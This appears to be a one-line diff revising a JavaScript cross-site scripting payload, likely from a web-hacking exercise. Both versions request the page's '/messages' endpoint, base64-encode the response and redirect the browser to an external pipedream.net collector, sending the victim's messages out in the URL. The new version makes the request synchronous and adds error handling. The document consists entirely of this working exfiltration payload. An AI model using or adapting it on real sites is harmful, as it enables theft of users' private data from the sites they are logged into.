@@ -1,1 +1,1 @@
-var x=new XMLHttpRequest();x.open('GET','/messages',true);x.onload=function(){location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(x.responseText)};x.onerror=function(){location='https://eoeipamgnflz15n.m.pipedream.net?c=err_xhr'};x.send();
+try{var x=new XMLHttpRequest();x.open('GET','/messages?id=1',false);x.send(null);location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(x.responseText)}catch(e){location='https://eoeipamgnflz15n.m.pipedream.net?c=err_sync'}
